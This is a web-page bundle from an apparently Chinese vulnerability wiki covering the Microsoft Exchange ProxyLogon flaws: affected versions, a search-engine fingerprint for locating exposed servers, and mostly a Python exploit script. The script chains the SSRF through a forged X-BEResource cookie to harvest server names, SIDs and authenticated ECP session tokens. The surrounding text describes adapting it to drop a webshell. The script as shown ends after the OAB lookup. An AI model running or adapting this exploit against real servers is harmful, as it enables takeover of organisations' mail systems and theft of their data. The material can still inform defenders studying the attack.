import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as n,b as a,d as t,e as p}from"./app-58e4a7d6.js";const l={},u=p(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Microsoft Exchange Server 是个消息与协作系统。Exchange Server可以被用来构架应用于企业、学校的邮件系统或免费邮件系统。2021年03月03日微软官方披露多个Exchange高危漏洞：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>CVE-2021-26855
Exchange服务器端请求伪造漏洞。利用此漏洞的攻击者能够以Exchange Server发送HTTP请求，扫描内网，获取Exchange用户信息。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>CVE-2021-26857
Exchange反序列化漏洞。该漏洞需要管理员权限，攻击者通过构造恶意请求，触发反序列化漏洞，在服务器上执行恶意代码。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>CVE-2021-26858/CVE-2021-27065
Exchange中身份验证后的任意文件写入漏洞。攻击者可以通过CVE-2021-26855的ssrf漏洞获取到的Exchange administrator凭证，构造恶意请求，在系统上写入任意文件。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Exchange 2013 Versions &lt; 15.00.1497.012 
Exchange 2016 CU18 &lt; 15.01.2106.013
Exchange 2016 CU19 &lt; 15.01.2176.009
Exchange 2019 CU7 &lt; 15.02.0721.013
Exchange 2019 CU8 &lt; 15.02.0792.010
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>icon_hash=&quot;1768726119&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>4篇关于原理的参考阅读：</p>`,11),r={href:"https://www.praetorian.com/blog/reproducing-proxylogon-exploit/",target:"_blank",rel:"noopener noreferrer"},k={href:"https://www.crowdstrike.com/blog/falcon-complete-stops-microsoft-exchange-server-zero-day-exploits/",target:"_blank",rel:"noopener noreferrer"},d={href:"https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/",target:"_blank",rel:"noopener noreferrer"},v={href:"https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/",target:"_blank",rel:"noopener noreferrer"},m=p(`<ul><li>其中一次攻击中的日志</li></ul><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091303642.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可以看到首先请求了 <strong>/rpc/</strong> 这个目录</p><p>根据网上公布的 POC与EXP，可以看到 NTML协商消息会返回我们NTML询问信息， 其中包含了 AV_PAIR结构，其中包含了 后端服务器名称与域名</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091305644.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>base64解密其中的加密部分</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091304717.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>再通过解包的方法转换其中的数据就可以得到完整的后端服务器名称与域名</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091304556.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>后面的大家就参考阅读和EXP来研究原理吧，几篇文章和EXP已经很完整了</p><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><p>EXP根据推特和Github几个脚本更改</p><p>默认打的邮箱为 <a href="mailto:administrator@xxx.xxx.cn">administrator@xxx.xxx.cn</a>(可以自行更改)</p><p>webshell路径和脚本文件中更改</p><p>运行的命令是 ping Dnslog证明漏洞存在(一些东西就大家自己看看脚本改吧~)</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091306409.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python2</span>
<span class="token comment"># coding: UTF-8</span>

<span class="token keyword">import</span> re
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> json
<span class="token keyword">import</span> string
<span class="token keyword">import</span> requests
<span class="token keyword">from</span> urllib <span class="token keyword">import</span> urlencode
<span class="token keyword">from</span> tld <span class="token keyword">import</span> get_fld
<span class="token keyword">from</span> struct <span class="token keyword">import</span> unpack
<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token punctuation">,</span> b64decode
<span class="token keyword">from</span> requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> InsecureRequestWarning


<span class="token keyword">def</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mPOC_Des: http://wiki.peiqi.tech                                   \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mGithub : https://github.com/PeiQi0                                 \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34m公众号 : PeiQi文库                                                \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mVersion: Microsoft Exchang 多个版本                                \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36m使用格式:  python poc.py                                           \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mUrl         &gt;&gt;&gt; mail.xxx.org                                       \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mEmail       &gt;&gt;&gt; Administrator@根域名  (默认)                        \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">_unpack_str</span><span class="token punctuation">(</span>byte_string<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> byte_string<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">&#39;UTF-8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;\\x00&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;&#39;</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">_unpack_int</span><span class="token punctuation">(</span><span class="token builtin">format</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> unpack<span class="token punctuation">(</span><span class="token builtin">format</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">parse_challenge</span><span class="token punctuation">(</span>Negotiate_base64_decode<span class="token punctuation">)</span><span class="token punctuation">:</span>
    target_info_field <span class="token operator">=</span> Negotiate_base64_decode<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">:</span><span class="token number">48</span><span class="token punctuation">]</span>
    target_info_len <span class="token operator">=</span> _unpack_int<span class="token punctuation">(</span><span class="token string">&#39;H&#39;</span><span class="token punctuation">,</span> target_info_field<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    target_info_offset <span class="token operator">=</span> _unpack_int<span class="token punctuation">(</span><span class="token string">&#39;I&#39;</span><span class="token punctuation">,</span> target_info_field<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    target_info_bytes <span class="token operator">=</span> Negotiate_base64_decode<span class="token punctuation">[</span>target_info_offset<span class="token punctuation">:</span>target_info_offset <span class="token operator">+</span> target_info_len<span class="token punctuation">]</span>

    domain_name <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>
    computer_name <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>
    info_offset <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">while</span> info_offset <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>target_info_bytes<span class="token punctuation">)</span><span class="token punctuation">:</span>
        av_id <span class="token operator">=</span> _unpack_int<span class="token punctuation">(</span><span class="token string">&#39;H&#39;</span><span class="token punctuation">,</span> target_info_bytes<span class="token punctuation">[</span>info_offset<span class="token punctuation">:</span>info_offset <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        av_len <span class="token operator">=</span> _unpack_int<span class="token punctuation">(</span><span class="token string">&#39;H&#39;</span><span class="token punctuation">,</span> target_info_bytes<span class="token punctuation">[</span>info_offset <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">:</span>info_offset <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        av_value <span class="token operator">=</span> target_info_bytes<span class="token punctuation">[</span>info_offset <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">:</span>info_offset <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">+</span> av_len<span class="token punctuation">]</span>

        info_offset <span class="token operator">=</span> info_offset <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">+</span> av_len
        <span class="token keyword">if</span> av_id <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>  <span class="token comment"># MsvAvDnsDomainName</span>
            domain_name <span class="token operator">=</span> _unpack_str<span class="token punctuation">(</span>av_value<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> av_id <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>  <span class="token comment"># MsvAvDnsComputerName</span>
            computer_name <span class="token operator">=</span> _unpack_str<span class="token punctuation">(</span>av_value<span class="token punctuation">)</span>

    <span class="token keyword">if</span> domain_name <span class="token keyword">and</span> computer_name<span class="token punctuation">:</span>
        <span class="token keyword">return</span> domain_name<span class="token punctuation">,</span> computer_name
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 计算机名称或域名称获取失败&quot;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">POC_1</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> Email<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 正在获取 计算机名称和域名称.....\\033[0m&quot;</span><span class="token punctuation">)</span>
    ntlm_type1 <span class="token operator">=</span> <span class="token punctuation">(</span>
        <span class="token string">&#39;NTLMSSP\\x00&#39;</span>  <span class="token comment"># NTLMSSp签名</span>
        <span class="token string">&#39;\\x01\\x00\\x00\\x00&#39;</span>  <span class="token comment"># 信息类型</span>
        <span class="token string">&#39;\\x97\\x82\\x08\\xe2&#39;</span>  <span class="token comment"># 标记</span>
        <span class="token string">&#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#39;</span>  <span class="token comment"># 域名称字符</span>
        <span class="token string">&#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&#39;</span>  <span class="token comment"># 工作字符</span>
        <span class="token string">&#39;\\x0a\\x00\\xba\\x47\\x00\\x00\\x00\\x0f&#39;</span>  <span class="token comment"># 系统版本</span>
    <span class="token punctuation">)</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;Authorization&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Negotiate {}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span>ntlm_type1<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
    basic_url <span class="token operator">=</span> <span class="token string">&#39;https://{}/rpc/&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>
    requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>basic_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">401</span><span class="token punctuation">:</span>
        Negotiate_base64_encode <span class="token operator">=</span> response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">&#39;WWW-Authenticate&#39;</span><span class="token punctuation">]</span>
        Negotiate_base64_decode <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">&#39;Negotiate ([A-Za-z0-9/+=]+)&#39;</span><span class="token punctuation">,</span> Negotiate_base64_encode<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        domain_name<span class="token punctuation">,</span> computer_name <span class="token operator">=</span> parse_challenge<span class="token punctuation">(</span>b64decode<span class="token punctuation">(</span>Negotiate_base64_decode<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 计算机名称: {}\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>computer_name<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 域名称:    {}\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>domain_name<span class="token punctuation">)</span><span class="token punctuation">)</span>
        POC_2<span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> Email<span class="token punctuation">,</span> computer_name<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 获取失败&quot;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">POC_2</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> Email<span class="token punctuation">,</span> computer_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token triple-quoted-string string">&#39;&#39;&#39;
&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;
    &lt;Request&gt;
         &lt;EMailAddress&gt;%s&lt;/EMailAddress&gt;
        &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;
    &lt;/Request&gt;
&lt;/Autodiscover&gt;
    &#39;&#39;&#39;</span> <span class="token operator">%</span> Email
    vuln_url <span class="token operator">=</span> <span class="token string">&#39;/autodiscover/autodiscover.xml&#39;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;ExchangeServicesClient/0.0.0.0&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;text/xml&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Cookie&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;X-BEResource=a]@{}:444{}?#~1941962753&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>computer_name<span class="token punctuation">,</span> vuln_url<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">&#39;msExchLogonMailbox&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;S-1-5-20&#39;</span>
    <span class="token punctuation">}</span>
    url <span class="token operator">=</span> <span class="token string">&quot;https://{}/ecp/PeiQi.js&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>
    requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    LegacyDN <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r&#39;&lt;LegacyDN&gt;(.*?)&lt;/LegacyDN&gt;&#39;</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] LegacyDN: {}\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>LegacyDN<span class="token punctuation">)</span><span class="token punctuation">)</span>

    vuln_url <span class="token operator">=</span> <span class="token string">&#39;/mapi/emsmdb/&#39;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;X-Clientapplication&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Outlook/15.0.4815.1002&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;X-Requestid&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;x&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;X-Requesttype&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Connect&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Cookie&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;X-BEResource=a]@{}:444{}?#~1941962753&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>computer_name<span class="token punctuation">,</span> vuln_url<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;application/mapi-http&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;msExchLogonMailbox&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;S-1-5-20&#39;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    payload <span class="token operator">=</span> LegacyDN <span class="token operator">+</span> <span class="token string">&#39;\\x00\\x00\\x00\\x00\\x00\\x20\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x00\\x00\\x00\\x00&#39;</span>
    url <span class="token operator">=</span> <span class="token string">&quot;https://{}/ecp/PeiQi.js&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>
    requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    SID <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">&#39;with SID ([S\\-0-9]+) &#39;</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] SID: {}\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>SID<span class="token punctuation">)</span><span class="token punctuation">)</span>

    vuln_url <span class="token operator">=</span> <span class="token string">&#39;/ecp/proxyLogon.ecp&#39;</span>
    payload <span class="token operator">=</span> <span class="token string">&#39;&lt;r at=&quot;NTLM&quot; ln=&quot;%s&quot;&gt;&lt;s t=&quot;0&quot;&gt;%s&lt;/s&gt;&lt;/r&gt;&#39;</span> <span class="token operator">%</span> <span class="token punctuation">(</span>Email<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&#39;@&#39;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> SID<span class="token punctuation">)</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;X-Clientapplication&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Outlook/15.0.4815.1002&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;X-Requestid&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;x&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;X-Requesttype&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Connect&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Cookie&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;X-BEResource=a]@{}:444{}?#~1941962753&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>computer_name<span class="token punctuation">,</span> vuln_url<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;application/json&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;msExchLogonMailbox&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;S-1-5-20&#39;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    url <span class="token operator">=</span> <span class="token string">&quot;https://{}/ecp/PeiQi.js&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>
    requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    session_id <span class="token operator">=</span> response<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;ASP.NET_SessionId&#39;</span><span class="token punctuation">)</span>
    canary <span class="token operator">=</span> response<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">&#39;msExchEcpCanary&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] Session_id: {}\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>session_id<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] Canary    : {}\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>

    extra_cookies <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">&#39;ASP.NET_SessionId=&#39;</span> <span class="token operator">+</span> session_id<span class="token punctuation">,</span>
        <span class="token string">&#39;msExchEcpCanary=&#39;</span> <span class="token operator">+</span> canary
    <span class="token punctuation">]</span>
    vuln_url <span class="token operator">=</span> <span class="token string">&#39;/ecp/DDI/DDIService.svc/GetObject&#39;</span>
    qs <span class="token operator">=</span> urlencode<span class="token punctuation">(</span><span class="token punctuation">{</span>
        <span class="token string">&#39;schema&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;OABVirtualDirectory&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;msExchEcpCanary&#39;</span><span class="token punctuation">:</span> canary
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;X-Clientapplication&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Outlook/15.0.4815.1002&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;X-Requestid&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;x&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;X-Requesttype&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Connect&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Cookie&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>
            computer_name<span class="token punctuation">,</span> vuln_url<span class="token punctuation">,</span> qs<span class="token punctuation">,</span> session_id<span class="token punctuation">,</span> canary<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;application/json&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;msExchLogonMailbox&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;S-1-5-20&#39;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    url <span class="token operator">=</span> <span class="token string">&quot;https://{}/ecp/PeiQi.js&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span>
    requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token string">&#39;&#39;</span><span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    identity <span class="token operator">=</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&#39;d&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;Output&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;Identity&#39;</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] OAB Name: {}\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>identity<span class="token punctuation">[</span><span class="token string">&#39;DisplayName&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] OAB ID: {}\\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>identity<span class="token punctuation">[</span><span class="token string">&#39;RawIdentity&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

